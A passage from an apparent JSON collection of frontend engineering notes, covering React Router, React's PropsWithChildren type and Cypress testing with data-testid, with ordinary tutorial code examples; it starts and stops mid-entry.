to export actions or reducers from the slice file.\n- Mutating state outside of reducers (only mutate state inside slice reducers).\n- Not organizing slices by feature, leading to a cluttered store.\n\n## Practical Applications\n\n- Managing feature-specific state (e.g., authentication, cart, user profile).\n- Reducing Redux boilerplate in new projects.\n- Improving code maintainability and scalability.\n\n## References\n\n- [Redux Toolkit: createSlice](https://redux-toolkit.js.org/api/createSlice)\n- [Redux Toolkit: Usage Guide](https://redux-toolkit.js.org/tutorials/quick-start)\n- [Redux Essentials Tutorial](https://redux.js.org/tutorials/essentials/part-2-app-structure)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Async Thunks:** Use `createAsyncThunk` with slices for handling async logic.\n- **Slice Composition:** Combine multiple slices for complex state management.\n- **Selector Functions:** Create selectors for efficient state access and memoization.\n- **Testing Slices:** Test reducers and actions in isolation"
    },
    {
      "id": "swe/frontend/react/routes/react-router-intro",
      "title": "React Router: A Well-Structured Overview",
      "path": [
        "swe",
        "frontend",
        "react",
        "routes",
        "react-router-intro"
      ],
      "content": "# React Router: A Well-Structured Overview\n\nReact Router enables client-side routing in React applications, allowing navigation between views without page reloads by mapping URL paths to components while maintaining browser history functionality.\n\n## Key Points\n\n- **Definition:** Declarative routing library for React that synchronizes UI with URLs using component-based route configuration.\n- **Client-Side Routing:** Navigation happens in browser without server requests, providing instant transitions and preserving application state.\n- **Core Components:** BrowserRouter (provider), Routes (container), Route (path-to-component mapping), Link/NavLink (navigation).\n- **Dynamic Routing:** Supports URL parameters (`:id`), query strings, and nested routes for complex application structures.\n- **History Management:** Uses browser History API for back/forward navigation and programmatic routing.\n- **Code Splitting:** Lazy load route components to reduce initial bundle size and improve performance.\n- **Data Loading:** Modern versions support route-level data fetching with loaders and actions (v6.4+).\n\n## Step-by-Step Explanation & Examples\n\n**Basic Router Setup**\n```jsx\nimport { BrowserRouter, Routes, Route } from 'react-router-dom';\n\nfunction App() {\n  return (\n    // BrowserRouter: Wraps app, provides routing context\n    // Uses HTML5 history API for clean URLs (/about vs /#/about)\n    <BrowserRouter>\n      {/* Routes: Container for all Route definitions */}\n      <Routes>\n        {/* Route: Maps path to component */}\n        <Route \n          path=\"/\"              // URL path to match\n          element={<Home />}    // Component to render\n        />\n        <Route path=\"/about\" element={<About />} />\n        <Route path=\"/contact\" element={<Contact />} />\n        \n        {/* 404 catch-all route */}\n        <Route path=\"*\" element={<NotFound />} />\n      </Routes>\n    </BrowserRouter>\n  );\n}\n```\n\n**Navigation with Links**\n```jsx\nimport { Link, NavLink } from 'react-router-dom';\n\nfunction Navigation() {\n  return (\n    <nav>\n      {/* Link: Basic navigation without page reload */}\n      <Link to=\"/\">Home</Link>\n      <Link to=\"/about\">About</Link>\n      \n      {/* NavLink: Adds active state styling */}\n      <NavLink \n        to=\"/dashboard\"\n        className={({ isActive }) => isActive ? 'active' : ''}\n        // isActive: true when current route matches\n      >\n        Dashboard\n      </NavLink>\n      \n      {/* Pass state between routes (hidden from URL) */}\n      <Link to=\"/profile\" state={{ from: 'nav' }}>\n        Profile\n      </Link>\n    </nav>\n  );\n}\n```\n\n**Dynamic Routes with Parameters**\n```jsx\nimport { useParams } from 'react-router-dom';\n\n// Route definition with parameter\n<Route path=\"/users/:userId\" element={<UserProfile />} />\n<Route path=\"/posts/:postId/comments/:commentId\" element={<Comment />} />\n\n// Access parameters in component\nfunction UserProfile() {\n  const { userId } = useParams();\n  // URL: /users/123 → userId = \"123\"\n  \n  return <h1>User Profile: {userId}</h1>;\n}\n```\n\n**Nested Routes with Layouts**\n```jsx\nimport { Outlet } from 'react-router-dom';\n\n// Layout component with persistent elements\nfunction DashboardLayout() {\n  return (\n    <div>\n      <aside>Sidebar</aside>\n      <main>\n        {/* Outlet: Renders child route components here */}\n        <Outlet />\n      </main>\n    </div>\n  );\n}\n\n// Route configuration\n<Route path=\"/dashboard\" element={<DashboardLayout />}>\n  <Route index element={<DashboardHome />} />\n  {/* index: default child route at /dashboard */}\n  \n  <Route path=\"profile\" element={<Profile />} />\n  {/* Renders at /dashboard/profile inside Outlet */}\n  \n  <Route path=\"settings\" element={<Settings />} />\n  {/* Renders at /dashboard/settings inside Outlet */}\n</Route>\n```\n\n**Programmatic Navigation**\n```jsx\nimport { useNavigate } from 'react-router-dom';\n\nfunction LoginForm() {\n  const navigate = useNavigate();\n  \n  const handleLogin = async (credentials) => {\n    await loginUser(credentials);\n    \n    // Navigate after async operation\n    navigate('/dashboard');\n    \n    // Navigate with options\n    navigate('/profile', { \n      replace: true,              // Replace history entry\n      state: { from: 'login' }    // Pass hidden data\n    });\n    \n    // Navigate backward/forward\n    navigate(-1);  // Go back\n    navigate(1);   // Go forward\n  };\n  \n  return <form onSubmit={handleLogin}>...</form>;\n}\n```\n\n**Protected Routes Pattern**\n```jsx\nimport { Navigate } from 'react-router-dom';\n\nfunction ProtectedRoute({ children }) {\n  const isAuthenticated = useAuth();\n  \n  // Redirect to login if not authenticated\n  return isAuthenticated ? children : <Navigate to=\"/login\" replace />;\n}\n\n// Usage\n<Route \n  path=\"/dashboard\" \n  element={\n    <ProtectedRoute>\n      <Dashboard />\n    </ProtectedRoute>\n  }\n/>\n```\n\n**Query Parameters and Location**\n```jsx\nimport { useSearchParams, useLocation } from 'react-router-dom';\n\nfunction SearchPage() {\n  // Read query params: /search?q=react&sort=newest\n  const [searchParams, setSearchParams] = useSearchParams();\n  const query = searchParams.get('q');      // \"react\"\n  const sort = searchParams.get('sort');    // \"newest\"\n  \n  // Update query params\n  setSearchParams({ q: 'javascript', sort: 'popular' });\n  \n  // Access full location object\n  const location = useLocation();\n  const { pathname, search, hash, state } = location;\n  \n  return <div>Searching for: {query}</div>;\n}\n```\n\n## Common Pitfalls\n\n- Forgetting to wrap app with BrowserRouter—causes \"useNavigate may only be used in context of Router\" errors.\n- Not using `index` prop for default child routes—results in empty Outlet rendering.\n- Using `<a>` tags instead of Link—causes full page reloads and loses SPA benefits.\n- Placing Routes outside BrowserRouter context—routing won't work.\n- Not handling 404s with catch-all route (`path=\"*\"`)—shows blank page for invalid URLs.\n- Over-nesting routes unnecessarily—makes route structure complex and hard to maintain.\n- Forgetting `end` prop on parent NavLinks—shows parent as active on all child routes.\n\n## Practical Applications\n\n- **Multi-Page SPAs:** Separate views (home, about, contact) without server round-trips.\n- **Dashboards:** Nested layouts with persistent sidebars and tabbed content sections.\n- **E-commerce:** Product listings, detail pages, cart, and checkout flows with dynamic routes.\n- **Authentication Flows:** Login, signup, password reset with protected routes and redirects.\n\n## References\n\n- [React Router Documentation](https://reactrouter.com/)\n- [React Router Tutorial](https://reactrouter.com/en/main/start/tutorial)\n- [React Router v6 Migration Guide](https://reactrouter.com/en/main/upgrading/v5)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Router Types:** BrowserRouter (clean URLs), HashRouter (hash-based URLs for static hosting), MemoryRouter (testing).\n- **Lazy Loading Routes:** Reduce bundle size with code splitting.\n  ```jsx\n  const Dashboard = lazy(() => import('./Dashboard'));\n  <Route path=\"/dashboard\" element={\n    <Suspense fallback={<Loading />}>\n      <Dashboard />\n    </Suspense>\n  } />\n  ```\n- **Route Loaders (v6.4+):** Fetch data before rendering route.\n  ```jsx\n  const router = createBrowserRouter([{\n    path: '/users/:id',\n    element: <UserProfile />,\n    loader: async ({ params }) => fetchUser(params.id)\n  }]);\n  // Access data: const user = useLoaderData();\n  ```\n- **Route Actions:** Handle form submissions and mutations.\n  ```jsx\n  action: async ({ request, params }) => {\n    const formData = await request.formData();\n    return updateUser(params.id, formData);\n  }\n  ```\n- **Relative Routing:** Navigate relative to current route, not URL.\n  ```jsx\n  <Link to=\"..\">Up one level</Link>\n  <Link to=\"../sibling\">Sibling route</Link>\n  ```\n- **ScrollRestoration:** Automatically restore scroll position on navigation (v6.4+).\n- **Error Boundaries:** Handle routing errors with errorElement prop.\n- **Search Params Handling:** useSearchParams hook for query string management.\n- **Location State:** Pass data between routes without URL exposure.\n- **Basename:** Configure base URL for apps deployed in subdirectories.\n  ```jsx\n  <BrowserRouter basename=\"/my-app\">\n  ```\n- **Navigation Blocking:** Prevent navigation with unsaved changes (unstable_useBlocker).\n- **Active Route Detection:** useMatch hook for custom active state logic.\n- **Route Matching:** Routes match in order—more specific routes should come first.\n- **Index Routes:** Default child route when parent path is matched exactly.\n- **Outlet Context:** Pass data from parent to child routes via Outlet context.\n- **Form Component:** Enhanced form handling with navigation integration (v6.4+).\n- **Prefetching:** Preload route data on hover for faster navigation."
    },
    {
      "id": "swe/frontend/react/types/PropsWithChildren-react",
      "title": "React PropsWithChildren: Complete Overview",
      "path": [
        "swe",
        "frontend",
        "react",
        "types",
        "PropsWithChildren-react"
      ],
      "content": "# React PropsWithChildren: Complete Overview\n\n`PropsWithChildren` is a TypeScript utility type in React that adds the `children` prop to your component's props interface. Instead of manually typing `children?: ReactNode` in every component that accepts children, `PropsWithChildren<T>` does it automatically. Think of it as a shortcut that says \"this component accepts all these props, plus children.\"\n\n## Key Points\n\n- **Purpose:** Automatically add `children` prop type to component props\n- **Syntax:** `PropsWithChildren<YourPropsType>`\n- **Type:** Adds `children?: ReactNode` to your props\n- **Use Case:** Any component that wraps other components or content\n- **Optional:** `children` is optional by default (can be undefined)\n\n## Basic Usage\n\n### Without PropsWithChildren\n\n```typescript\nimport { ReactNode } from 'react';\n\ninterface ButtonProps {\n  onClick: () => void;\n  variant: 'primary' | 'secondary';\n  children?: ReactNode;  // Manual typing\n}\n\nfunction Button({ onClick, variant, children }: ButtonProps) {\n  return (\n    <button onClick={onClick} className={variant}>\n      {children}\n    </button>\n  );\n}\n\n// Usage\n<Button onClick={handleClick} variant=\"primary\">\n  Click Me\n</Button>\n```\n\n### With PropsWithChildren\n\n```typescript\nimport { PropsWithChildren } from 'react';\n\ninterface ButtonProps {\n  onClick: () => void;\n  variant: 'primary' | 'secondary';\n  // children added automatically by PropsWithChildren\n}\n\nfunction Button({ onClick, variant, children }: PropsWithChildren<ButtonProps>) {\n  return (\n    <button onClick={onClick} className={variant}>\n      {children}\n    </button>\n  );\n}\n\n// Same usage\n<Button onClick={handleClick} variant=\"primary\">\n  Click Me\n</Button>\n```\n\n## Common Patterns\n\n### Simple Wrapper Component\n\n```typescript\ninterface CardProps {\n  title: string;\n  className?: string;\n}\n\nfunction Card({ title, className, children }: PropsWithChildren<CardProps>) {\n  return (\n    <div className={className}>\n      <h2>{title}</h2>\n      <div className=\"card-body\">\n        {children}\n      </div>\n    </div>\n  );\n}\n\n// Usage\n<Card title=\"Profile\">\n  <p>Name: John Doe</p>\n  <p>Email: john@example.com</p>\n</Card>\n```\n\n### Layout Components\n\n```typescript\ninterface ContainerProps {\n  maxWidth?: 'sm' | 'md' | 'lg' | 'xl';\n  padding?: boolean;\n}\n\nfunction Container({ \n  maxWidth = 'lg', \n  padding = true, \n  children \n}: PropsWithChildren<ContainerProps>) {\n  return (\n    <div className={`container-${maxWidth} ${padding ? 'p-4' : ''}`}>\n      {children}\n    </div>\n  );\n}\n\n// Usage\n<Container maxWidth=\"md\">\n  <Header />\n  <MainContent />\n  <Footer />\n</Container>\n```\n\n### Modal/Dialog Components\n\n```typescript\ninterface ModalProps {\n  isOpen: boolean;\n  onClose: () => void;\n  title: string;\n}\n\nfunction Modal({ \n  isOpen, \n  onClose, \n  title, \n  children \n}: PropsWithChildren<ModalProps>) {\n  if (!isOpen) return null;\n  \n  return (\n    <div className=\"modal-backdrop\">\n      <div className=\"modal\">\n        <div className=\"modal-header\">\n          <h3>{title}</h3>\n          <button onClick={onClose}>×</button>\n        </div>\n        <div className=\"modal-body\">\n          {children}\n        </div>\n      </div>\n    </div>\n  );\n}\n\n// Usage\n<Modal isOpen={showModal} onClose={handleClose} title=\"Confirm\">\n  <p>Are you sure you want to delete this item?</p>\n  <button onClick={handleConfirm}>Yes</button>\n  <button onClick={handleClose}>No</button>\n</Modal>\n```\n\n### Provider Components\n\n```typescript\ninterface ThemeProviderProps {\n  theme: 'light' | 'dark';\n}\n\nfunction ThemeProvider({ \n  theme, \n  children \n}: PropsWithChildren<ThemeProviderProps>) {\n  return (\n    <ThemeContext.Provider value={theme}>\n      {children}\n    </ThemeContext.Provider>\n  );\n}\n\n// Usage\n<ThemeProvider theme=\"dark\">\n  <App />\n</ThemeProvider>\n```\n\n## When children Might Be Required\n\n```typescript\n// children optional (default with PropsWithChildren)\nfunction Card({ children }: PropsWithChildren) {\n  return <div className=\"card\">{children}</div>;\n}\n\n<Card />  // ✅ Valid\n<Card>Content</Card>  // ✅ Valid\n\n// Make children required - manually type it\ninterface CardProps {\n  children: ReactNode;  // No question mark = required\n}\n\nfunction Card({ children }: CardProps) {\n  return <div className=\"card\">{children}</div>;\n}\n\n<Card />  // ❌ Error: children required\n<Card>Content</Card>  // ✅ Valid\n```\n\n## PropsWithChildren vs Manual Typing\n\n```typescript\n// Option 1: PropsWithChildren (recommended for simple cases)\nfunction Box({ children }: PropsWithChildren) {\n  return <div>{children}</div>;\n}\n\n// Option 2: Manual typing (more explicit)\ninterface BoxProps {\n  children?: ReactNode;\n}\n\nfunction Box({ children }: BoxProps) {\n  return <div>{children}</div>;\n}\n\n// Option 3: Inline (quick and dirty)\nfunction Box({ children }: { children?: ReactNode }) {\n  return <div>{children}</div>;\n}\n\n// All three are equivalent\n// Use PropsWithChildren for consistency\n```\n\n## Empty Props with Children\n\n```typescript\n// When component only accepts children\nfunction Wrapper({ children }: PropsWithChildren) {\n  return <div className=\"wrapper\">{children}</div>;\n}\n\n// Equivalent to:\nfunction Wrapper({ children }: { children?: ReactNode }) {\n  return <div className=\"wrapper\">{children}</div>;\n}\n\n// Usage\n<Wrapper>\n  <Content />\n</Wrapper>\n```\n\n## Combining with Other Props\n\n```typescript\ninterface AlertProps {\n  type: 'success' | 'error' | 'warning' | 'info';\n  dismissible?: boolean;\n  onDismiss?: () => void;\n}\n\nfunction Alert({ \n  type, \n  dismissible = false, \n  onDismiss, \n  children \n}: PropsWithChildren<AlertProps>) {\n  return (\n    <div className={`alert alert-${type}`}>\n      {children}\n      {dismissible && (\n        <button onClick={onDismiss} className=\"alert-close\">\n          ×\n        </button>\n      )}\n    </div>\n  );\n}\n\n// Usage\n<Alert type=\"success\" dismissible onDismiss={handleDismiss}>\n  Successfully saved!\n</Alert>\n```\n\n## Render Props Pattern\n\n```typescript\ninterface DataFetcherProps<T> {\n  url: string;\n  children: (data: T | null, loading: boolean) => ReactNode;\n}\n\nfunction DataFetcher<T>({ \n  url, \n  children \n}: DataFetcherProps<T>) {\n  const [data, setData] = useState<T | null>(null);\n  const [loading, setLoading] = useState(true);\n  \n  useEffect(() => {\n    fetch(url)\n      .then(res => res.json())\n      .then(data => {\n        setData(data);\n        setLoading(false);\n      });\n  }, [url]);\n  \n  return <>{children(data, loading)}</>;\n}\n\n// Usage\n<DataFetcher<User> url=\"/api/user\">\n  {(user, loading) => (\n    loading ? <div>Loading...</div> : <div>{user?.name}</div>\n  )}\n</DataFetcher>\n\n// Note: This uses children as function, not ReactNode\n// Don't use PropsWithChildren here - manual typing needed\n```\n\n## Common Pitfalls\n\n```typescript\n// ❌ Using PropsWithChildren when children is a function\ninterface RenderProps {\n  data: string;\n}\n\n// Wrong - PropsWithChildren expects ReactNode\nfunction Component({ children }: PropsWithChildren<RenderProps>) {\n  return <div>{children}</div>;  // TypeScript error if passing function\n}\n\n// ✅ Correct - manually type function children\nfunction Component({ data, children }: RenderProps & { children: (data: string) => ReactNode }) {\n  return <div>{children(data)}</div>;\n}\n\n\n// ❌ Accessing children when it might be undefined\nfunction Component({ children }: PropsWithChildren) {\n  return <div>{children.length}</div>;  // Error: children might be undefined\n}\n\n// ✅ Check for existence\nfunction Component({ children }: PropsWithChildren) {\n  if (!children) return null;\n  return <div>Has content</div>;\n}\n\n\n// ❌ Trying to map over children without React.Children\nfunction Component({ children }: PropsWithChildren) {\n  return <>{children.map(child => ...)}</>;  // Error: children not array\n}\n\n// ✅ Use React.Children utilities\nimport { Children } from 'react';\n\nfunction Component({ children }: PropsWithChildren) {\n  return (\n    <>\n      {Children.map(children, (child, index) => (\n        <div key={index}>{child}</div>\n      ))}\n    </>\n  );\n}\n```\n\n## What PropsWithChildren Actually Does\n\n```typescript\n// PropsWithChildren definition (simplified):\ntype PropsWithChildren<P = unknown> = P & { children?: ReactNode };\n\n// So this:\nPropsWithChildren<{ name: string }>\n\n// Is equivalent to:\n{ name: string } & { children?: ReactNode }\n\n// Which becomes:\n{ name: string; children?: ReactNode }\n\n// That's it - just adds children?: ReactNode to your type\n```\n\n## Alternative: FC (Functional Component)\n\n```typescript\nimport { FC } from 'react';\n\n// FC automatically includes children\nconst Button: FC<{ onClick: () => void }> = ({ onClick, children }) => {\n  return <button onClick={onClick}>{children}</button>;\n};\n\n// Equivalent to:\ninterface ButtonProps {\n  onClick: () => void;\n}\n\nfunction Button({ onClick, children }: PropsWithChildren<ButtonProps>) {\n  return <button onClick={onClick}>{children}</button>;\n}\n\n// Note: React team recommends avoiding FC in favor of explicit typing\n// PropsWithChildren is preferred\n```\n\n## When to Use What\n\n```typescript\n// ✅ Use PropsWithChildren: Component wraps content\nfunction Card({ title, children }: PropsWithChildren<{ title: string }>) {\n  return (\n    <div>\n      <h2>{title}</h2>\n      {children}\n    </div>\n  );\n}\n\n// ✅ Manual typing: children is required\ninterface CardProps {\n  children: ReactNode;  // Required\n}\n\n// ✅ Manual typing: children is a function (render props)\ninterface DataProps {\n  children: (data: Data) => ReactNode;\n}\n\n// ✅ No children type: Component doesn't accept children\ninterface ButtonProps {\n  onClick: () => void;\n  label: string;  // Using label instead of children\n}\n\nfunction Button({ onClick, label }: ButtonProps) {\n  return <button onClick={onClick}>{label}</button>;\n}\n```\n\n## References\n\n- [React TypeScript Cheatsheet](https://react-typescript-cheatsheet.netlify.app/)\n- [React Docs: TypeScript](https://react.dev/learn/typescript)\n- [PropsWithChildren Source](https://github.com/DefinitelyTyped/DefinitelyTyped/blob/master/types/react/index.d.ts)\n\n---\n\n## Summary\n\n**PropsWithChildren:** Adds `children?: ReactNode` to your props type automatically.\n\n**Syntax:**\n```typescript\nPropsWithChildren<YourPropsType>\n```\n\n**Equivalent to:**\n```typescript\nYourPropsType & { children?: ReactNode }\n```\n\n**Use when:** Component wraps other components/content.\n\n**Don't use when:** children is a function (render props) or required (use manual typing).\n\n**Rule of thumb:** Default to PropsWithChildren for wrapper components. Use manual typing for special cases."
    },
    {
      "id": "swe/frontend/testing/data-testid-cypress",
      "title": "Cypress Testing with data-testid: Complete Overview",
      "path": [
        "swe",
        "frontend",
        "testing",
        "data-testid-cypress"
      ],
      "content": "# Cypress Testing with data-testid: Complete Overview\n\n`data-testid` is a custom HTML attribute used to select elements in Cypress tests, providing stable, implementation-independent selectors that won't break when CSS classes or text content changes. Instead of relying on fragile selectors like class names or text, you add `data-testid=\"login-button\"` to elements and select them with `cy.get('[data-testid=\"login-button\"]')`. Think of data-testid as adding name tags to people at a party—even if they change clothes or hairstyles, you can still identify them reliably.\n\n## Key Points\n\n- **Purpose:** Stable, test-specific selectors that survive UI refactoring\n- **Syntax:** Add `data-testid=\"unique-name\"` to HTML elements\n- **Selection:** Use `cy.get('[data-testid=\"name\"]')` in tests\n- **Best Practice:** Preferred over classes, IDs, or text-based selectors\n- **Convention:** Use kebab-case for consistent naming\n\n## Step-by-Step Explanation & Examples\n\n1. **Basic data-testid Usage**\n\n   ```jsx\n   // Component\n   function LoginForm() {\n     return (\n       <form data-testid=\"login-form\">\n         <input \n           data-testid=\"email-input\" \n           type=\"email\" \n           placeholder=\"Email\"\n         />\n         <input \n           data-testid=\"password-input\" \n           type=\"password\"\n           placeholder=\"Password\"\n         />\n         <button data-testid=\"submit-button\">Login</button>\n       </form>\n     );\n   }\n   \n   // Cypress test\n   describe('Login Form', () => {\n     it('allows user to login', () => {\n       cy.visit('/login');\n       cy.get('[data-testid=\"email-input\"]').type('user@example.com');\n       cy.get('[data-testid=\"password-input\"]').type('password123');\n       cy.get('[data-testid=\"submit-button\"]').click();\n     });\n   });\n   ```\n\n2. **Why data-testid Over Other Selectors**\n\n   ```jsx\n   // ❌ Bad: CSS classes (break when styling changes)\n   cy.get('.btn-primary.login-button').click();\n   \n   // ❌ Bad: Element IDs (not always unique, used for JS logic)\n   cy.get('#loginButton').click();\n   \n   // ❌ Bad: Text content (breaks with translations/copy changes)\n   cy.contains('Log In').click();\n   \n   // ❌ Bad: Complex CSS selectors (fragile, hard to read)\n   cy.get('form > div:nth-child(2) > button').click();\n   \n   // ✅ Good: data-testid (stable, descriptive, test-specific)\n   cy.get('[data-testid=\"login-button\"]').click();\n   \n   // Refactoring won't break tests:\n   <button className=\"new-style\" data-testid=\"login-button\">\n     Sign In  {/* Text changed, test still works */}\n   </button>\n   ```\n\n3. **Custom Cypress Command (DRY Pattern)**\n\n   ```javascript\n   // cypress/support/commands.js\n   Cypress.Commands.add('getByTestId', (testId) => {\n     return cy.get(`[data-testid=\"${testId}\"]`);\n   });\n   \n   // Usage in tests (cleaner)\n   cy.getByTestId('email-input').type('user@example.com');\n   cy.getByTestId('password-input').type('password123');\n   cy.getByTestId('submit-button').click();\n   \n   // Can also add TypeScript types\n   declare global {\n     namespace Cypress {\n       interface Chainable {\n         getByTestId(testId: string): Chainable<JQuery<HTMLElement>>;\n       }\n     }\n   }\n   ```\n\n4. **Testing Lists and Dynamic Content**\n\n   ```jsx\n   // Component\n   function UserList({ users }) {\n     return (\n       <ul data-testid=\"user-list\">\n         {users.map((user, index) => (\n           <li key={user.id} data-testid={`user-item-${user.id}`}>\n             <span data-testid={`user-name-${user.id}`}>{user.name}</span>\n             <button data-testid={`delete-user-${user.id}`}>Delete</button>\n           </li>\n         ))}\n       </ul>\n     );\n   }\n   \n   // Cypress test\n   it('displays user list and allows deletion', () => {\n     cy.getByTestId('user-list')\n       .children()\n       .should('have.length', 3);\n     \n     cy.getByTestId('user-name-123').should('have.text', 'Alice');\n     cy.getByTestId('delete-user-123').click();\n     \n     cy.getByTestId('user-list')\n       .children()\n       .should('have.length', 2);\n   });\n   ```\n\n5. **Nested Component Testing**\n\n   ```jsx\n   // Parent component\n   function Dashboard() {\n     return (\n       <div data-testid=\"dashboard\">\n         <header data-testid=\"dashboard-header\">\n           <h1>Welcome</h1>\n         </header>\n         <main data-testid=\"dashboard-content\">\n           <Widget data-testid=\"stats-widget\" />\n         </main>\n       </div>\n     );\n   }\n   \n   // Cypress test - scope within parent\n   it('displays dashboard with widgets', () => {\n     cy.getByTestId('dashboard').within(() => {\n       cy.getByTestId('dashboard-header').should('be.visible');\n       cy.getByTestId('dashboard-content').should('exist');\n       cy.getByTestId('stats-widget').should('be.visible');\n     });\n   });\n   ```\n\n6. **Conditional Rendering and State Changes**\n\n   ```jsx\n   // Component\n   function Form() {\n     const [loading, setLoading] = useState(false);\n     const [error, setError] = useState(null);\n     \n     return (\n       <form data-testid=\"contact-form\">\n         <input data-testid=\"name-input\" />\n         \n         {loading && <div data-testid=\"loading-spinner\">Loading...</div>}\n         {error && <div data-testid=\"error-message\">{error}</div>}\n         \n         <button \n           data-testid=\"submit-button\"\n           disabled={loading}\n         >\n           Submit\n         </button>\n       </form>\n     );\n   }\n   \n   // Cypress test\n   it('shows loading state on submit', () => {\n     cy.getByTestId('name-input').type('Alice');\n     cy.getByTestId('submit-button').click();\n     \n     cy.getByTestId('loading-spinner').should('be.visible');\n     cy.getByTestId('submit-button').should('be.disabled');\n     \n     // Wait for async operation\n     cy.getByTestId('loading-spinner').should('not.exist');\n   });\n   \n   it('displays error message on failure', () => {\n     cy.intercept('POST', '/api/contact', {\n       statusCode: 400,\n       body: { error: 'Invalid email' }\n     });\n     \n     cy.getByTestId('submit-button').click();\n     cy.getByTestId('error-message')\n       .should('be.visible')\n       .and('contain', 'Invalid email');\n   });\n   ```\n\n## Common Pitfalls\n\n- Using non-unique testids across the page (`data-testid=\"button\"` everywhere)\n- Not removing data-testid in production builds (increases HTML size)\n- Mixing selector strategies (testids + classes + text in same test suite)\n- Using camelCase instead of kebab-case (`data-testid=\"loginButton\"` vs `\"login-button\"`)\n- Adding testids to every element (only add to interactive/important elements)\n- Not updating testids when component purpose changes\n\n## Practical Applications\n\n- Form testing (inputs, buttons, validation messages)\n- Navigation testing (menus, links, dropdowns)\n- Modal and dialog testing (open, close, actions)\n- Table and list testing (rows, cells, pagination)\n- Component integration testing (parent-child interactions)\n\n## References\n\n- [Cypress Best Practices: Selecting Elements](https://docs.cypress.io/guides/references/best-practices#Selecting-Elements)\n- [Testing Library: Priority Guide](https://testing-library.com/docs/queries/about/#priority)\n- [Cypress Documentation](https://docs.cypress.io/)\n- [React Testing: data-testid](https://kentcdodds.com/blog/making-your-ui-tests-resilient-to-change)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Removing data-testid in Production:**\n  ```javascript\n  // babel.config.js (React)\n  module.exports = {\n    plugins: [\n      process.env.NODE_ENV === 'production' && [\n        'babel-plugin-react-remove-properties',\n        { properties: ['data-testid'] }\n      ]\n    ].filter(Boolean)\n  };\n  \n  // Result: data-testid stripped in production builds\n  // Before: <button data-testid=\"submit\">Submit</button>\n  // After: <button>Submit</button>\n  \n  // Webpack alternative\n  {\n    test: /\\.(js|jsx)$/,\n    loader: 'string-replace-loader',\n    options: {\n      search: /data-testid=\"[^\"]*\"/g,\n      replace: ''\n    }\n  }\n  ```\n\n- **Testing Library Integration:**\n  ```javascript\n  // React Testing Library uses same pattern\n  import { render, screen } from '@testing-library/react';\n  \n  test('login form works', () => {\n    render(<LoginForm />);\n    \n    // Same testids work in both Cypress and RTL\n    const emailInput = screen.getByTestId('email-input');\n    const submitButton = screen.getByTestId('submit-button');\n    \n    fireEvent.change(emailInput, { target: { value: 'test@example.com' }});\n    fireEvent.click(submitButton);\n  });\n  \n  // Benefit: Consistent selectors across test frameworks\n  ```\n\n- **Naming Conventions:**\n  ```jsx\n  // ✅ Good: Descriptive, kebab-case\n  data-testid=\"user-profile-edit-button\"\n  data-testid=\"shopping-cart-total\"\n  data-testid=\"notification-close-icon\"\n  \n  // ✅ Good: Component-scoped with IDs\n  data-testid=\"product-card-123\"\n  data-testid=\"comment-reply-button-456\"\n  \n  // ❌ Bad: Too generic\n  data-testid=\"button\"\n  data-testid=\"div\"\n  data-testid=\"container\"\n  \n  // ❌ Bad: camelCase (inconsistent with HTML conventions)\n  data-testid=\"userProfileEditButton\"\n  \n  // ❌ Bad: Implementation details\n  data-testid=\"redux-connect-component\"\n  data-testid=\"styled-button-wrapper\"\n  ```\n\n- **Page Object Model Pattern:**\n  ```javascript\n  // cypress/pages/LoginPage.js\n  class LoginPage {\n    elements = {\n      emailInput: () => cy.getByTestId('email-input'),\n      passwordInput: () => cy.getByTestId('password-input'),\n      submitButton: () => cy.getByTestId('submit-button'),\n      errorMessage: () => cy.getByTestId('error-message')\n    };\n    \n    visit() {\n      cy.visit('/login');\n    }\n    \n    login(email, password) {\n      this.elements.emailInput().type(email);\n      this.elements.passwordInput().type(password);\n      this.elements.submitButton().click();\n    }\n    \n    assertErrorMessage(message) {\n      this.elements.errorMessage()\n        .should('be.visible')\n        .and('contain', message);\n    }\n  }\n  \n  export default new LoginPage();\n  \n  // Test file\n  import LoginPage from '../pages/LoginPage';\n  \n  it('shows error on invalid login', () => {\n    LoginPage.visit();\n    LoginPage.login('invalid@example.com', 'wrongpass');\n    LoginPage.assertErrorMessage('Invalid credentials');\n  });\n  ```\n\n- **TypeScript Type Safety:**\n  ```typescript\n  // types/testIds.ts\n  export const TEST_IDS = {\n    LOGIN_FORM: 'login-form',\n    EMAIL_INPUT: 'email-input',\n    PASSWORD_INPUT: 'password-input',\n    SUBMIT_BUTTON: 'submit-button',\n    ERROR_MESSAGE: 'error-message'\n  } as const;\n  \n  type TestId = typeof TEST_IDS[keyof typeof TEST_IDS];\n  \n  // Component\n  import { TEST_IDS } from './types/testIds';\n  \n  function LoginForm() {\n    return (\n      <form data-testid={TEST_IDS.LOGIN_FORM}>\n        <input data-testid={TEST_IDS.EMAIL_INPUT} />\n        <button data-testid={TEST_IDS.SUBMIT_BUTTON}>Login</button>\n      </form>\n    );\n  }\n  \n  // Cypress test\n  cy.getByTestId(TEST_IDS.EMAIL_INPUT).type('test@example.com');\n  \n  // Benefits: Autocomplete, refactoring safety, single source of truth\n  ```\n\n- **Testing Accessibility with data-testid:**\n  ```jsx\n  // ⚠️ data-testid doesn't replace proper accessibility\n  \n  // ❌ Bad: Only testid, no accessibility\n  <button data-testid=\"submit-button\">\n    <span>→</span>\n  </button>\n  \n  // ✅ Good: Both testid AND proper accessibility\n  <button \n    data-testid=\"submit-button\"\n    aria-label=\"Submit form\"\n    type=\"submit\"\n  >\n    <span aria-hidden=\"true\">→</span>\n  </button>\n  \n  // Cypress can test both\n  cy.getByTestId('submit-button')\n    .should('have.attr', 'aria-label', 'Submit form')\n    .and('have.attr', 'type', 'submit');\n  ```\n\n- **Multiple Test Frameworks:**\n  ```javascript\n  // Same testids work across frameworks\n  \n  // Cypress E2E\n  cy.getByTestId('login-button').click();\n  \n  // React Testing Library (unit tests)\n  const button = screen.getByTestId('login-button');\n  fireEvent.click(button);\n  \n  // Playwright\n  await page.locator('[data-testid=\"login-button\"]').click();\n  \n  // Selenium\n  driver.findElement(By.css('[data-testid=\"login-button\"]')).click();\n  ```\n\n- **Complex Interactions:**\n  ```javascript\n  // Multi-step form testing\n  describe('Checkout flow', () => {\n    it('completes full checkout process', () => {\n      // Step 1: Cart\n      cy.getByTestId('cart-item-123').within(() => {\n        cy.getByTestId('quantity-input').clear().type('2');\n        cy.getByTestId('update-quantity-button').click();\n      });\n      cy.getByTestId('checkout-button').click();\n      \n      // Step 2: 